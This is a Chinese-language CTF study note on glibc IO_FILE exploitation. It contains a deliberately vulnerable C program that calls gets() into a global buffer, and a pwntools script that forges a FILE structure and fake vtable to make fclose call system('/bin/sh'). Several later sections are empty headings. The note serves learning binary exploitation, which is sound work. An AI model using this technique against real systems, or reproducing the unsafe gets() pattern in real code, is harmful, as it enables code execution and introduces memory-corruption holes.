---
title: IO_FILE学习笔记
date: 2022-9-15 20:32:00 +0800
author: sirius
categories: [CTF, pwn]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---



首先跟着angelboy [这个视频](https://www.youtube.com/watch?v=_ZnnGZygnzE) 的节奏，学习一下文件利用的基本操作，ppt里有的内容全都不写了，直接看ppt吧。只记录一下学习过程中遇到的问题。



# 0x01  _lock的offset获取

`_lock`的offset如何获取？

![image-20220922222338848](/assets/img/2022/image-20220922222338848.png)

 `p &(*(struct _IO_FILE_plus *) buf_addr)->file->_lock`



# 0x02 如何call [rax+0x10]?

PPT里的example.c

```c
#include<stdio.h>
#include<stdlib.h>

char buf[0x100] = {0};
FILE *fp;
int main(){
   fp = fopen("./file.txt", "rw");
   gets(buf);
   fclose(fp);
}
```

![image-20220922215726442](/assets/img/2022/image-20220922215726442.png)

![image-20220922215819660](/assets/img/2022/image-20220922215819660.png)

首先是这一部分，我在libc2.23下实际跑了一下，并非图上所示的获得了一次`call [rax+0x10]`的机会

实际运行结果如下:

![image-20220922220342110](/assets/img/2022/image-20220922220342110.png)

会进入free

实际运行流程图：

**贴一个流程图**





那么如何获得`call [rax+0x10]`呢

答案是原先payload中开头padding部分 `"a"*0x88` 改成 `"a".ljust(0x88, "\x00")`

![image-20220922220510885](/assets/img/2022/image-20220922220510885.png)

分析：

![image-20220922221007513](/assets/img/2022/image-20220922221007513.png)

所以关键是`_flags`这个值，会影响进不进`_IO_file_close_it`



然后payload是`'/bin/sh'.ljust(0x88, '\x00')`时，会获得一次`call [rax+0x88]`，这个是`vtable->_close`

![image-20220922223233730](/assets/img/2022/image-20220922223233730.png)

![image-20220922223525729](/assets/img/2022/image-20220922223525729.png)

![image-20220922223611848](/assets/img/2022/image-20220922223611848.png)





这个example.c的wp

```python
from pwn import *


r = process('./baby_file')

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()

# debug("bcall fclose")
#fp=0x601160 
buf=0x601060  
fake_vtable = buf+0x110
p = '/bin/sh\x00'.ljust(0x88, '\x00') + p64(buf+0x500) #_lock
p = p.ljust(0xd8, '\x00') + p64(fake_vtable) #vtable offset 0xd8
p = p.ljust(0x100, '\x00') + p64(buf)
p = p.ljust(0x110+0x88, '\x00') + p64(0x7ffff7a523a0) #system_addr, PIE & ASLR off, only for debug   

r.sendline(p)

r.interactive()
```



# 0x03 pwnable.tw上的seethefile

好像和视频里的练习题是一样的

以后做一下





# 0x04 house of orange (glibc 2.23)



# 0x05 house of orange (glibc 2.24)



# 0x06 WCTF 2017  wannaheap



# 0x07 HITCON 2017 : Ghost in The Heap



# 0x08 HCTF2017 babyprintf



# 0x09 House of Pig

##  **XCTF 2021 final**



# 0x10 house of apple

## pwn_oneday
